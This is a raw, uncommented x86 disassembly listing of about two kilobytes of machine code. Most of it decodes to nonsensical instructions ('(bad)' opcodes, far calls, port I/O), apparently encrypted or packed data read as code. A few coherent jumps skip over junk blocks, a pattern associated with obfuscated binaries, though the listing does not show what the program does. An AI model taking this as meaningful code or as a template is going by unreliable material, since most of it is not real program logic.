  40b5f7:	xchg   ebx,eax
  40b5f8:	fnstsw ax
  40b5fa:	adc    DWORD PTR [eax-0x37],ecx
  40b5fd:	rol    bh,cl
  40b5ff:	inc    edi
  40b600:	add    al,0xd1
  40b602:	popf   
  40b603:	add    esp,DWORD PTR [edx+0x77eb996a]
  40b609:	mov    DWORD PTR [edi+0x11],ecx
  40b60c:	xor    al,0x86
  40b60e:	xchg   ebp,eax
  40b60f:	mov    bh,0xc2
  40b611:	xor    ebx,eax
  40b613:	push   0x22
  40b615:	pop    eax
  40b616:	xchg   ebp,eax
  40b617:	sbb    bl,BYTE PTR [ebx]
  40b619:	pop    ebx
  40b61a:	and    eax,0x5126fa36
  40b61f:	inc    esp
  40b620:	(bad)  ds:[ecx]
  40b623:	jecxz  0x40b65f
  40b625:	pop    edi
  40b626:	ret    
  40b627:	fwait
  40b628:	pop    eax
  40b629:	cld    
  40b62a:	cdq    
  40b62b:	jle    0x40b5c5
  40b62d:	pusha  
  40b62e:	leave  
  40b62f:	inc    ebp
  40b630:	push   ebp
  40b631:	pop    edi
  40b632:	cdq    
  40b633:	pop    edi
  40b634:	aam    0xbc
  40b636:	mov    ds:0xb5dae3d9,eax
  40b63b:	sbb    al,0xb4
  40b63d:	repnz pop edx
  40b63f:	mov    bl,0x30
  40b641:	mov    dl,0x58
  40b643:	sub    al,0x6e
  40b645:	and    esi,DWORD PTR [ebp+0x2ae0a054]
  40b64b:	fisubr DWORD PTR [edx-0x1dc06cd0]
  40b651:	shr    BYTE PTR ds:0x9190394,cl
  40b657:	sbb    eax,DWORD PTR [ecx+0x7a]
  40b65a:	adc    al,0x98
  40b65c:	mov    BYTE PTR [ebx+0x46e9c808],al
  40b662:	mov    bh,0x9a
  40b664:	jmp    0x40b601
  40b666:	or     BYTE PTR [ebx+0x5d37d61e],bl
  40b66c:	push   ds
  40b66d:	stos   BYTE PTR es:[edi],al
  40b66e:	mov    edx,0x890582c3
  40b673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b674:	push   esi
  40b675:	mov    ebx,0x88f21367
  40b67a:	dec    esi
  40b67b:	ja     0x40b628
  40b67d:	fmulp  st(6),st
  40b67f:	jmp    0x9110:0xba7a53a7
  40b686:	mov    ebp,0x49ecd01b
  40b68b:	test   BYTE PTR [edx],dh
  40b68d:	xor    al,0x24
  40b68f:	test   al,0x84
  40b691:	mov    edi,0xd1417255
  40b696:	scas   al,BYTE PTR es:[edi]
  40b697:	push   es
  40b698:	cwde   
  40b699:	inc    edi
  40b69a:	clc    
  40b69b:	or     BYTE PTR [ecx+0x7a],dh
  40b69e:	adc    DWORD PTR [eax+0x7d9cfdfc],esp
  40b6a4:	ror    DWORD PTR [ebx+0x62d33ce9],1
  40b6aa:	add    BYTE PTR [edi],0x43
  40b6ad:	xor    dh,BYTE PTR [esi]
  40b6af:	mov    ds:0x8bf0458b,eax
  40b6b4:	dec    ebp
  40b6b5:	in     al,dx
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0xa1
  40b6da:	cli    
  40b6db:	sbb    BYTE PTR [ebx+0x7e7ef2d9],0x2e
  40b6e2:	jge    0x40b762
  40b6e4:	jle    0x40b6e2
  40b6e6:	aam    0xc8
  40b6e8:	pusha  
  40b6e9:	pushf  
  40b6ea:	jno    0x40b738
  40b6ec:	xchg   ebp,eax
  40b6ed:	lds    edx,FWORD PTR [edx-0x32fbd85e]
  40b6f3:	test   DWORD PTR [edi-0x5f20d0c6],edx
  40b6f9:	cmp    BYTE PTR [ecx+ebp*8+0x7a],dh
  40b6fd:	pop    ebx
  40b6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6ff:	jmp    0x40b76b
  40b701:	inc    esp
  40b702:	loope  0x40b6b9
  40b704:	mov    ch,0x60
  40b706:	xor    DWORD PTR [ebp+esi*4+0x5b],eax
  40b70a:	dec    esp
  40b70b:	es ja  0x40b6ab
  40b70e:	mov    BYTE PTR [eax+0x2a],al
  40b711:	imul   eax,DWORD PTR [ebx+ecx*8-0x7d],0x2b
  40b716:	and    eax,DWORD PTR [edx-0x659c4692]
  40b71c:	rcl    cl,0x5c
  40b71f:	out    0x8f,eax
  40b721:	rcr    dh,1
  40b723:	cmp    eax,0xc2c5eb75
  40b728:	fsubr  DWORD PTR [esi+0x29f81345]
  40b72e:	cmp    al,0x97
  40b730:	mov    WORD PTR [ebp-0x2626d050],ss
  40b736:	cdq    
  40b737:	je     0x40b6d9
  40b739:	add    eax,0x9cf2e436
  40b73e:	ds call 0x1906:0x1e15cfaa
  40b746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b747:	sub    ah,BYTE PTR [edx+0x40]
  40b74a:	outs   dx,DWORD PTR ds:[esi]
  40b74b:	inc    ecx
  40b74c:	sub    BYTE PTR [ecx+0xe],ch
  40b74f:	imul   esp,ebp,0xe9c0b347
  40b755:	xchg   esp,eax
  40b756:	mov    ds:0xf8313e1,eax
  40b75b:	loop   0x40b760
  40b75d:	jl     0x40b796
  40b75f:	pushf  
  40b760:	ret    
  40b761:	push   cs
  40b762:	mov    esi,DWORD PTR [ecx+ebx*8-0x5c449b7e]
  40b769:	stos   BYTE PTR es:[edi],al
  40b76a:	fdivr  DWORD PTR [edi+0x18]
  40b76d:	xor    DWORD PTR [esp+ecx*1-0x3d],edx
  40b771:	push   edi
  40b772:	xor    ah,cl
  40b774:	ss popa 
  40b776:	push   ss
  40b777:	jecxz  0x40b785
  40b779:	inc    esp
  40b77a:	sbb    BYTE PTR ds:0xbd3422f5,cl
  40b780:	in     al,dx
  40b781:	inc    ebx
  40b782:	pop    ebp
  40b783:	addr16 dec ecx
  40b785:	xor    DWORD PTR [edx-0x5c],eax
  40b788:	xor    dh,BYTE PTR [ecx-0x58]
  40b78b:	and    ch,BYTE PTR ds:0x1cbb5c26
  40b791:	push   ss
  40b792:	dec    eax
  40b793:	lea    eax,[ecx-0x41030507]
  40b799:	cmc    
  40b79a:	fdivr  DWORD PTR ds:0xc3d1aca0
  40b7a0:	sahf   
  40b7a1:	clc    
  40b7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7a3:	aam    0xbb
  40b7a5:	jae    0x40b754
  40b7a7:	mov    ds,WORD PTR [ecx]
  40b7a9:	mov    WORD PTR [ebp+0x2aaa57b3],?
  40b7af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7b0:	mul    al
  40b7b2:	xchg   esi,eax
  40b7b3:	push   ebp
  40b7b4:	sub    al,0x35
  40b7b6:	mov    edi,DWORD PTR [ebx+0x6fc17500]
  40b7bc:	mov    dl,0x7f
  40b7be:	ins    DWORD PTR es:[edi],dx
  40b7bf:	mov    edi,0x2a9442c7
  40b7c4:	loop   0x40b7de
  40b7c6:	jns    0x40b838
  40b7c8:	ins    BYTE PTR es:[edi],dx
  40b7c9:	jne    0x40b7ed
  40b7cb:	gs dec eax
  40b7cd:	fsubr  QWORD PTR [ebx-0x5ac5ec49]
  40b7d3:	lds    ebp,FWORD PTR [eax]
  40b7d5:	jmp    0x4214:0x237fc0f5
  40b7dc:	popa   
  40b7dd:	push   ecx
  40b7de:	dec    ebp
  40b7df:	pop    ecx
  40b7e0:	retf   0x23ac
  40b7e3:	adc    eax,0x758b0734
  40b7e8:	outs   dx,BYTE PTR ds:[esi]
  40b7e9:	pop    edi
  40b7ea:	mov    ecx,0x10a2251e
  40b7ef:	mov    eax,0x5ad6aa55
  40b7f4:	jle    0x40b82a
  40b7f6:	lock push 0x25
  40b7f9:	stos   BYTE PTR es:[edi],al
  40b7fa:	pop    eax
  40b7fb:	xchg   ah,cl
  40b7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7fe:	mov    cl,0x26
  40b800:	dec    eax
  40b801:	scas   al,BYTE PTR es:[edi]
  40b802:	cwde   
  40b803:	add    BYTE PTR [esi-0x5445a1cc],ah
  40b809:	retf   0x149f
  40b80c:	mov    al,ds:0x6b9ee710
  40b811:	mov    ds:0x67751590,eax
  40b816:	sub    BYTE PTR [ecx-0x7d974a02],0x21
  40b81d:	and    edi,edi
  40b81f:	mov    cl,0xae
  40b821:	adc    al,0xcd
  40b824:	nop
  40b825:	call   0xb165:0xf5913923
  40b82c:	mov    edx,0xbed3e5e5
  40b831:	aas    
  40b832:	jmp    0xcce9:0xae234706
  40b839:	push   edx
  40b83a:	jge    0x40b846
  40b83c:	mov    dl,0xdb
  40b83e:	sbb    bl,BYTE PTR [ecx]
  40b840:	sbb    dh,al
  40b842:	inc    ecx
  40b843:	push   esp
  40b844:	aaa    
  40b845:	loop   0x40b84b
  40b847:	sub    edx,DWORD PTR [edi]
  40b849:	imul   edx,DWORD PTR [ebx],0xd27b14bb
  40b84f:	mov    eax,ds:0x12412976
  40b854:	fs xchg ecx,eax
  40b856:	shl    esp,0x1c
  40b859:	dec    ebx
  40b85a:	adc    eax,0xd0889bdd
  40b85f:	add    edi,edx
  40b861:	aas    
  40b862:	scas   al,BYTE PTR es:[edi]
  40b863:	(bad)  
  40b864:	mov    ecx,0xc71acf48
  40b869:	xor    eax,0xcfa7c970
  40b86e:	mov    dl,0x30
  40b870:	sbb    eax,0xd371336e
  40b875:	mov    al,ds:0x99baa28e
  40b87a:	cmp    ecx,ecx
  40b87c:	jae    0x40b87b
  40b87e:	pop    ebp
  40b87f:	mov    dl,0x6b
  40b881:	shl    BYTE PTR [ebx+0x63],cl
  40b884:	and    ah,bh
  40b886:	push   cs
  40b887:	aas    
  40b888:	repz dec esp
  40b88a:	jmp    esp
  40b88c:	jmp    0xbd50d933
  40b891:	outs   dx,BYTE PTR ds:[esi]
  40b892:	std    
  40b893:	jle    0x40b8ef
  40b895:	iret   
  40b896:	push   es
  40b897:	pop    edi
  40b898:	push   cs
  40b899:	aas    
  40b89a:	aad    0xd5
  40b89c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b89d:	call   0x9d27:0x9773dc7a
  40b8a4:	dec    edi
  40b8a5:	popa   
  40b8a6:	xor    eax,0xf4380b54
  40b8ab:	lahf   
  40b8ac:	imul   ebp,DWORD PTR [esi-0x48f5a322],0x40
  40b8b3:	xchg   esp,eax
  40b8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8b5:	test   BYTE PTR [ebx+0x286f2e72],0xb3
  40b8bc:	repz jge 0x40b878
  40b8bf:	cmp    al,ah
  40b8c1:	cdq    
  40b8c2:	lahf   
  40b8c3:	dec    esi
  40b8c4:	push   cs
  40b8c5:	xor    cl,BYTE PTR ds:0xe5d9f65
  40b8cb:	cs sbb al,0x13
  40b8ce:	jno    0x40b8d8
  40b8d0:	push   es
  40b8d1:	inc    ebp
  40b8d2:	loope  0x40b8c3
  40b8d4:	jle    0x40b856
  40b8d6:	xor    al,0x2e
  40b8d8:	xchg   esp,eax
  40b8d9:	gs inc eax
  40b8db:	leave  
  40b8dc:	push   cs
  40b8dd:	push   0x8d86038f
  40b8e2:	mov    cl,0x89
  40b8e4:	mov    eax,ds:0x4401d60d
  40b8e9:	cld    
  40b8ea:	push   cs
  40b8eb:	mov    ebx,0xccdc857c
  40b8f0:	aas    
  40b8f1:	push   esp
  40b8f2:	loop   0x40b888
  40b8f4:	cmc    
  40b8f5:	(bad)  
  40b8f7:	or     al,0xa5
  40b8f9:	or     ebx,DWORD PTR [ebp-0x5fd95ca6]
  40b8ff:	and    ax,0xe6ca
  40b903:	call   0x6236:0x35c1c094
  40b90a:	inc    esp
  40b90b:	jb     0x40b986
  40b90d:	jns    0x40b8f1
  40b90f:	loop   0x40b8b8
  40b911:	mov    eax,0xfaea18c5
  40b916:	lea    edi,[ecx-0x53]
  40b919:	jge    0x40b936
  40b91b:	and    BYTE PTR [eax+0x46c2748b],al
  40b921:	and    BYTE PTR [ecx+edx*2-0x13],0x29
  40b926:	cwde   
  40b927:	dec    esp
  40b928:	xor    DWORD PTR [edx+0x38],eax
  40b92b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b92c:	rol    BYTE PTR [edi+0x73cf16ec],cl
  40b932:	jmp    0x40b8e1
  40b934:	mov    cl,0x35
  40b936:	scas   eax,DWORD PTR es:[edi]
  40b937:	dec    eax
  40b938:	retf   0xb69c
  40b93b:	or     eax,0x70227d04
  40b940:	sub    al,0xb5
  40b942:	or     al,0xa6
  40b944:	lea    edi,[edi-0x6]
  40b947:	xor    al,0x88
  40b949:	inc    esi
  40b94a:	jae    0x40b9bb
  40b94c:	test   al,0xcc
  40b94e:	out    dx,al
  40b94f:	out    0xea,eax
  40b951:	(bad)  
  40b952:	push   eax
  40b953:	call   0x6499:0x178b6d08
  40b95a:	loope  0x40b92a
  40b95c:	dec    eax
  40b95d:	push   edi
  40b95e:	pop    esi
  40b95f:	cs pop ecx
  40b961:	das    
  40b962:	imul   ebx,DWORD PTR [edx-0x4f4525d7],0xcba1b574
  40b96c:	js     0x40b90a
  40b96e:	mov    dl,0xd8
  40b970:	mov    ch,0xad
  40b972:	loop   0x40b9d1
  40b974:	inc    edi
  40b975:	dec    ebx
  40b976:	or     esp,esi
  40b978:	leave  
  40b979:	or     ecx,esp
  40b97b:	cmc    
  40b97c:	mov    ds:0x4cd32411,al
  40b981:	inc    esi
  40b982:	adc    bl,al
  40b984:	cld    
  40b985:	mov    edi,0x46a10dda
  40b98a:	fld    TBYTE PTR [esp+eiz*8-0x8]
  40b98e:	mov    eax,0xaf385152
  40b993:	ret    0xef22
  40b996:	push   ss
  40b997:	xchg   ebp,eax
  40b998:	ucomiss xmm1,DWORD PTR [ebx-0x24]
  40b99c:	jnp    0x40b936
  40b99e:	xor    dh,al
  40b9a0:	mov    bh,0xb7
  40b9a2:	inc    esp
  40b9a3:	pop    ebx
  40b9a4:	popf   
  40b9a5:	(bad)  
  40b9a6:	(bad)  [ecx*1+0x3146b312]
  40b9ad:	push   edi
  40b9ae:	xchg   edx,eax
  40b9af:	pop    ss
  40b9b0:	mov    al,0xb2
  40b9b2:	sub    al,0xa5
  40b9b4:	cs es aam 0x27
  40b9b8:	pop    esp
  40b9b9:	lods   al,BYTE PTR ds:[esi]
  40b9ba:	jbe    0x40b9c9
  40b9bc:	xchg   BYTE PTR ds:0x9be0db6e,al
  40b9c2:	jmp    0x40ba1d
  40b9c4:	retf   
  40b9c5:	imul   edi,ebx,0x8371ed1d
  40b9cb:	push   0x1428c290
  40b9d0:	xchg   esp,eax
  40b9d1:	test   dl,ch
  40b9d3:	repz inc eax
  40b9d5:	mov    edi,0x18fccfbb
  40b9da:	pop    ecx
  40b9db:	mov    dh,0x65
  40b9dd:	push   ss
  40b9de:	mov    al,0x17
  40b9e0:	loop   0x40b9a1
  40b9e2:	loope  0x40b9bd
  40b9e4:	adc    eax,0xddbe8dbe
  40b9e9:	out    0x38,eax
  40b9eb:	and    DWORD PTR [ebx-0x69],edi
  40b9ee:	sbb    al,0xef
  40b9f0:	lea    edx,[eiz*1-0x7579229a]
  40b9f7:	hlt    
  40b9f8:	repz adc esp,DWORD PTR [ebx]
  40b9fb:	sbb    al,0xbe
  40b9fe:	lahf   
  40b9ff:	out    dx,al
  40ba00:	push   es
  40ba01:	call   0xa815:0xc3b653bd
  40ba08:	je     0x40ba34
  40ba0a:	sub    al,0xbb
  40ba0c:	and    al,0xa1
  40ba0e:	mov    BYTE PTR [edx-0x43],ch
  40ba11:	mov    al,0x7c
  40ba13:	pop    ebp
  40ba14:	xchg   ebp,eax
  40ba15:	mov    cx,WORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	push   edx
  40ba36:	aaa    
  40ba37:	cmc    
  40ba38:	jo     0x40b9c3
  40ba3a:	icebp  
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba08
  40ba42:	cli    
  40ba43:	adc    ch,BYTE PTR [ebx-0x5b]
  40ba46:	jo     0x40b9e7
  40ba48:	fsub   QWORD PTR [esi+0x4d85071c]
  40ba4e:	imul   edi,DWORD PTR [ebp-0x5c],0x59d1208a
  40ba55:	mov    ebx,DWORD PTR [esi+ebx*4-0x1c]
  40ba59:	sti    
  40ba5a:	addr16 out 0x9c,eax
  40ba5d:	call   0xbba67210
  40ba62:	mov    ecx,0x164d2585
  40ba67:	not    edi
  40ba69:	retf   0x879c
  40ba6c:	cmp    DWORD PTR ds:0x2a4df1ba,eax
  40ba72:	inc    ecx
  40ba73:	imul   dh
  40ba75:	mov    ah,0x5d
  40ba77:	int    0xd7
  40ba79:	mov    ds:0x4cd88b26,eax
  40ba7e:	sub    al,BYTE PTR [edi+0x72]
  40ba81:	imul   ebx,DWORD PTR [ebp+0x43322944],0xffffffa1
  40ba88:	pop    ss
  40ba89:	adc    esp,edx
  40ba8b:	repnz fcomi st,st(6)
  40ba8e:	and    al,0xf0
  40ba90:	popf   
  40ba91:	dec    ecx
  40ba92:	add    al,0x74
  40ba94:	out    dx,al
  40ba95:	out    0x22,al
  40ba97:	mov    ebp,edi
  40ba99:	cmp    eax,0x96722888
  40ba9e:	rol    ebx,1
  40baa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baa1:	(bad)  
  40baa2:	push   ds
  40baa3:	cwde   
  40baa4:	or     esi,DWORD PTR [edi+0x2bfd5ff2]
  40baaa:	or     eax,0xda370572
  40baaf:	sub    DWORD PTR [edi-0x39],eax
  40bab2:	sub    al,0x7a
  40bab4:	test   al,0x40
  40bab6:	call   0xca7b:0xac5a566a
  40babd:	(bad)  
  40babe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40babf:	cdq    
  40bac0:	jnp    0x40ba75
  40bac2:	cwde   
  40bac3:	mov    ds:0x4dd9c32d,eax
  40bac8:	dec    edx
  40bac9:	fisttp QWORD PTR [ebx]
  40bacb:	adc    al,0x37
  40bacd:	mov    DWORD PTR [ebp+0x3a101919],ebx
  40bad3:	mov    al,0x2a
  40bad5:	jmp    0x1a6f77e5
  40bada:	out    dx,eax
  40badb:	inc    esi
  40badc:	xchg   esi,eax
  40badd:	and    eax,0x795c7d77
  40bae2:	stos   DWORD PTR es:[edi],eax
  40bae3:	in     al,dx
  40bae4:	jmp    FWORD PTR [esi-0x20]
  40bae7:	cwde   
  40bae8:	sbb    al,0x6
  40baea:	out    dx,eax
  40baeb:	inc    esp
  40baec:	jmp    0x40baf0
  40baee:	and    esi,ebp
  40baf0:	cmc    
  40baf1:	dec    esp
  40baf2:	cwde   
  40baf3:	inc    edx
  40baf4:	jns    0x40ba92
  40baf6:	out    dx,eax
  40baf7:	pop    ecx
  40baf8:	sub    bh,0xb1
  40bafb:	out    0x5d,al
  40bafd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bafe:	mov    edi,0x8218bfcb
  40bb03:	mov    al,ds:0x3b9cdadb
  40bb08:	sub    esp,ecx
  40bb0a:	xchg   ebp,eax
  40bb0b:	cmp    al,0xd0
  40bb0d:	xlat   BYTE PTR ds:[ebx]
  40bb0e:	js     0x40bb47
  40bb10:	xor    esp,DWORD PTR [eax+0x6d5e7a48]
  40bb16:	pop    esp
  40bb17:	jb     0x40bb45
  40bb19:	and    BYTE PTR [eax-0x74d49ede],dl
  40bb1f:	jne    0x40bb9a
  40bb21:	add    eax,DWORD PTR [eax+eiz*2-0x24fb5e6a]
  40bb28:	repnz xor bl,bh
  40bb2b:	mov    al,0x92
  40bb2d:	(bad)  
  40bb2e:	mov    bl,0x6f
  40bb30:	fldenv [edi+eiz*1+0x7]
  40bb34:	sub    ah,BYTE PTR [edi+0x54f6fd5d]
  40bb3a:	inc    edx
  40bb3b:	call   0x350d:0x839a09ad
  40bb42:	sbb    ebp,DWORD PTR [eax+0x63]
  40bb45:	dec    edi
  40bb46:	mov    ch,0xda
  40bb48:	std    
  40bb49:	js     0x40baee
  40bb4b:	adc    ecx,DWORD PTR [ebx]
  40bb4d:	inc    ecx
  40bb4e:	pop    ecx
  40bb4f:	jmp    0x96e2258b
  40bb54:	push   eax
  40bb55:	cwde   
  40bb56:	(bad)  
  40bb57:	int3   
  40bb58:	pop    ebp
  40bb59:	ss clc 
  40bb5b:	aas    
  40bb5c:	call   0xb346626a
  40bb61:	mov    al,0xd1
  40bb63:	and    esi,DWORD PTR [edx-0x74e485fc]
  40bb69:	xchg   DWORD PTR [ecx],ecx
  40bb6b:	push   0xec35b4ef
  40bb70:	rcl    DWORD PTR [ebx+ecx*8+0x13906a35],0xe6
  40bb78:	mov    ds:0x9d890658,al
  40bb7d:	jmp    0x40bb9e
  40bb7f:	das    
  40bb80:	dec    edx
  40bb81:	and    al,ah
  40bb83:	inc    edi
  40bb84:	add    eax,0xa838efe8
  40bb89:	retf   0xed3d
  40bb8c:	mov    ah,0x88
  40bb8e:	aam    0x4d
  40bb90:	and    dl,cl
  40bb92:	pop    es
  40bb93:	adc    edx,DWORD PTR [edx-0x2c628b58]
  40bb99:	sub    eax,DWORD PTR [ebp-0x745534fd]
  40bb9f:	es fdivp st(6),st
  40bba2:	jae    0x40bb7c
  40bba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba5:	frstpm(287 only) 
  40bba7:	out    dx,al
  40bba8:	call   0x1d0fe75b
  40bbad:	fcmovnbe st,st(7)
  40bbaf:	(bad)  
  40bbb0:	clc    
  40bbb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbb2:	adc    bh,BYTE PTR [edi]
  40bbb4:	sub    edx,ebx
  40bbb6:	and    ebp,0x3d
  40bbb9:	dec    edi
  40bbba:	xchg   DWORD PTR ds:0xe3a8b4ed,eax
  40bbc0:	jbe    0x40bbb2
  40bbc2:	dec    esp
  40bbc3:	sbb    DWORD PTR [esi+0x1e],ebx
  40bbc6:	jle    0x40bb90
  40bbc8:	fmul   DWORD PTR [edi-0x4c]
  40bbcb:	mov    bl,0xe7
  40bbcd:	ss out dx,eax
  40bbcf:	hlt    
  40bbd0:	hlt    
  40bbd1:	push   0x69
  40bbd3:	and    DWORD PTR [esi-0x47],esi
  40bbd6:	stc    
  40bbd7:	cli    
  40bbd8:	out    0x56,al
  40bbda:	ins    DWORD PTR es:[edi],dx
  40bbdb:	ds push ecx
  40bbdd:	lahf   
  40bbde:	jbe    0x40bc55
  40bbe0:	cdq    
  40bbe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe2:	loopne 0x40bbb4
  40bbe4:	mov    cl,BYTE PTR [eax-0x6d]
  40bbe7:	push   ecx
  40bbe8:	xchg   ebx,eax
  40bbe9:	in     eax,0x33
  40bbeb:	inc    ecx
  40bbec:	sbb    DWORD PTR [eax+0x5b],ebp
  40bbef:	popf   
  40bbf0:	(bad)  
  40bbf1:	sar    BYTE PTR [esi+0xd0cf854],0x85
  40bbf8:	xchg   esp,eax
  40bbf9:	push   edi
  40bbfa:	jb     0x40bbd0
  40bbfc:	jge    0x40bbd5
  40bbfe:	adc    eax,0x1854c77c
  40bc03:	and    ch,BYTE PTR [edi+0x1c]
  40bc06:	xchg   edi,eax
  40bc07:	add    esi,ecx
  40bc09:	sub    DWORD PTR [edi+edi*1],ebx
  40bc0c:	not    DWORD PTR [edi]
  40bc0e:	adc    ah,ah
  40bc10:	jp     0x40bc7e
  40bc12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc13:	mov    edi,0xefc2997f
  40bc18:	dec    esi
  40bc19:	nop
  40bc1a:	cmp    BYTE PTR [eax+ebp*8-0x782a7e2d],dl
  40bc21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc22:	and    eax,0x54b2dcc6
  40bc27:	xlat   BYTE PTR ds:[ebx]
  40bc28:	(bad)  
  40bc29:	repnz xchg ecx,eax
  40bc2b:	ins    DWORD PTR es:[edi],dx
  40bc2c:	mov    ebx,0x96062418
  40bc31:	jae    0x40bc9e
  40bc33:	adc    bl,BYTE PTR [esi+0x1553cb21]
  40bc39:	push   0xee8e2e3e
  40bc3e:	mov    ds:0x4df2dcc,eax
  40bc43:	xor    DWORD PTR [eax-0x5b85178e],edx
  40bc49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc4a:	xchg   ebx,eax
  40bc4b:	std    
  40bc4c:	dec    esi
  40bc4d:	adc    al,bl
  40bc4f:	(bad)  
  40bc50:	scas   al,BYTE PTR es:[edi]
  40bc51:	enter  0xbbf2,0x71
  40bc55:	xor    edi,DWORD PTR [eax]
  40bc57:	test   eax,0xb0e90378
  40bc5c:	or     bh,BYTE PTR [eax+ecx*2+0x72d343be]
  40bc63:	mov    ah,ch
  40bc65:	push   edx
  40bc66:	(bad)  
  40bc67:	ins    DWORD PTR es:[edi],dx
  40bc68:	cmp    ecx,eax
  40bc6a:	fwait
  40bc6b:	ins    DWORD PTR es:[edi],dx
  40bc6c:	fdiv   QWORD PTR [ecx+0x42d6cbb4]
  40bc72:	jbe    0x40bc68
  40bc74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc75:	adc    bh,dh
  40bc77:	xor    eax,0xc4c8c5ca
  40bc7c:	xchg   ecx,eax
  40bc7d:	push   ss
  40bc7e:	cmp    eax,0xe07f9a70
  40bc83:	daa    
  40bc84:	clc    
  40bc85:	jb     0x40bc30
  40bc87:	mov    eax,ds:0x7cb20c2d
  40bc8c:	xor    ah,BYTE PTR [esi]
  40bc8e:	imul   ebp,DWORD PTR [edi-0x51cdc470],0xffffffc8
  40bc95:	neg    DWORD PTR [edx+0x24]
  40bc98:	outs   dx,DWORD PTR ds:[esi]
  40bc99:	sti    
  40bc9a:	adc    eax,ebp
  40bc9c:	call   0x72ff1927
  40bca1:	repnz clc 
  40bca3:	mov    DWORD PTR [ebp-0x65],esi
  40bca6:	pop    ebx
  40bca7:	cmc    
  40bca8:	mov    ecx,0xfcd8771
  40bcad:	inc    ebp
  40bcae:	xchg   edx,eax
  40bcaf:	jmp    0x40bc8f
  40bcb1:	xchg   DWORD PTR [ebx],edx
  40bcb3:	es adc esp,0x7a5e9688
  40bcba:	iret   
  40bcbb:	mov    BYTE PTR [ecx],0x69
  40bcbe:	jmp    0xd96a:0x44aa8d1b
  40bcc5:	cs out 0xc6,al
  40bcc8:	sti    
  40bcc9:	inc    ecx
  40bcca:	dec    ebx
  40bccb:	push   0x29
  40bccd:	xchg   BYTE PTR [eax-0x3620c9e5],bl
  40bcd3:	jg     0x40bcd4
  40bcd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd6:	call   0x9b203477
  40bcdb:	inc    ebp
  40bcdc:	xchg   esp,eax
  40bcdd:	sti    
  40bcde:	push   esp
  40bcdf:	mov    ebx,0x707f9cf8
  40bce4:	xor    al,0x9f
  40bce6:	mov    bl,0x13
  40bce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bce9:	mov    ds,WORD PTR [eax]
  40bceb:	jne    0x40bce5
  40bced:	lock into 
  40bcef:	xor    al,0x59
  40bcf1:	fdivr  st(2),st
  40bcf3:	jge    0x40bd5c
  40bcf5:	mov    ah,0x25
  40bcf7:	out    dx,eax
  40bcf8:	lods   al,BYTE PTR ds:[esi]
  40bcf9:	cmp    DWORD PTR [edi],edx
  40bcfb:	cli    
  40bcfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcfd:	or     esi,DWORD PTR [ebx-0x55]
  40bd00:	scas   al,BYTE PTR es:[edi]
  40bd01:	mov    dl,0xca
  40bd03:	jne    0x40bd5c
  40bd05:	cwde   
  40bd06:	cld    
  40bd07:	imul   ebx,DWORD PTR [ebx-0x2a],0xffffffe7
  40bd0b:	in     al,dx
  40bd0c:	xor    BYTE PTR [esi-0x629ceab7],bh
  40bd12:	outs   dx,BYTE PTR ds:[esi]
  40bd13:	in     al,dx
  40bd14:	sbb    BYTE PTR [ebx+0x577bafa0],dl
  40bd1a:	fisub  DWORD PTR [edx-0x55]
  40bd1d:	je     0x40bca1
  40bd1f:	inc    ebp
  40bd20:	js     0x40bd49
  40bd22:	ds retf 
  40bd24:	shl    DWORD PTR [edi+0x78],0x11
  40bd28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd29:	adc    ch,al
  40bd2b:	xchg   edi,eax
  40bd2c:	les    esi,FWORD PTR [edi]
  40bd2e:	test   eax,0x408d50e3
  40bd33:	sbb    BYTE PTR [esi],al
  40bd35:	adc    DWORD PTR [edx],edi
  40bd37:	push   edi
  40bd38:	call   0xf328:0x7d0a413c
  40bd3f:	mov    eax,0x28629494
  40bd44:	imul   ebp,DWORD PTR [ecx+eax*4],0x7d
  40bd48:	push   cs
  40bd49:	mov    dl,0x7b
  40bd4b:	loope  0x40bd75
  40bd4d:	dec    edi
  40bd4e:	pop    eax
  40bd4f:	int    0x4e
